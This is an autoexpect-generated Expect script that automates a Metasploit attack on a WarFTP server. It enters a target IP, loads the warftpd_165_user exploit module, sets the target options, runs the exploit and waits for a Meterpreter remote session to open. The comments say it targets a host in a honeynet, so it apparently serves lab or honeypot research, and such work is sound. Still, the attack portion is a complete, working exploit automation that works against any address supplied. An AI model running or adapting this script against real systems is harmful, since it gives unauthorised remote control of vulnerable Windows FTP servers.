#!/usr/bin/expect -f
#Autoexpect script for Warftp attack to 10.0.23.10 in HoneyNet 1


# This Expect script was generated by autoexpect on Sat Apr 11 19:23:50 2020
# Expect and autoexpect were both written by Don Libes, NIST.
#
# Note that autoexpect does not guarantee a working script.  It
# necessarily has to guess about certain things.  Two reasons a script
# might fail are:
#
# 1) timing - A surprising number of programs (rn, ksh, zsh, telnet,
# etc.) and devices discard or ignore keystrokes that arrive "too
# quickly" after prompts.  If you find your new script hanging up at
# one spot, try adding a short sleep just before the previous send.
# Setting "force_conservative" to 1 (see below) makes Expect do this
# automatically - pausing briefly before sending each character.  This
# pacifies every program I know of.  The -c flag makes the script do
# this in the first place.  The -C flag allows you to define a
# character to toggle this mode off and on.

set force_conservative 0  ;# set to 1 to force conservative mode even if
			  ;# script wasn't run conservatively originally
if {$force_conservative} {
	set send_slow {1 .1}
	proc send {ignore arg} {
		sleep .1
		exp_send -s -- $arg
	}
}

#
# 2) differing output - Some programs produce different output each time
# they run.  The "date" command is an obvious example.  Another is
# ftp, if it produces throughput statistics at the end of a file
# transfer.  If this causes a problem, delete these patterns or replace
# them with wildcards.  An alternative is to use the -p flag (for
# "prompt") which makes Expect only look for the last line of output
# (i.e., the prompt).  The -P flag allows you to define a character to
# toggle this mode off and on.
#
# Read the man page for more info.
#
# -Don


set timeout -1
spawn ./warftp_honey1
match_max 100000
expect "which IP to target for the warftp attack?\r
"
send -- "10.0.23.10\r"


expect "*starting the Metasploit Framework console*mmsf5\[0m \[0m>*"
send -- "search warftp\r"


expect "*search warftp\r\r
\[0m\r
Matching Modules*exploit/windows/ftp/warftpd_165_user*msf5\[0m \[0m> "
send -- "use exploit/windows/ftp/warftpd_165_user\r"


expect "use exploit/windows/ftp/warftpd_165_user\r\r
\[0m\[4mmsf5\[0m exploit(\[1m\[31mwindows/ftp/warftpd_165_user\[0m) \[0m> "
send -- "set rhosts 10.0.23.10\r"


expect -exact "set rhosts 10.0.23.10\r\r
\[0mrhosts => 10.0.23.10\r
\[4mmsf5\[0m exploit(\[1m\[31mwindows/ftp/warftpd_165_user\[0m) \[0m> "
send -- "set target 2\r"

expect -exact "set target 2\r\r
\[0mtarget => 2\r
\[4mmsf5\[0m exploit(\[1m\[31mwindows/ftp/warftpd_165_user\[0m) \[0m> "
send -- "exploit\r"


expect "*Meterpreter session*opened*10.0.23.10*mmeterpreter\[0m > \[0m\[0m"
send -- "quit\r"

expect -exact "quit\r\r
\[0m\[1m\[34m\[*\]\[0m Shutting down Meterpreter...\r
\r
\[1m\[34m\[*\]\[0m 10.0.23.10 - Meterpreter session*msf5\[0m exploit(\[1m\[31mwindows/ftp/warftpd_165_user\[0m) \[0m> "
send -- "exit\r"
expect eof
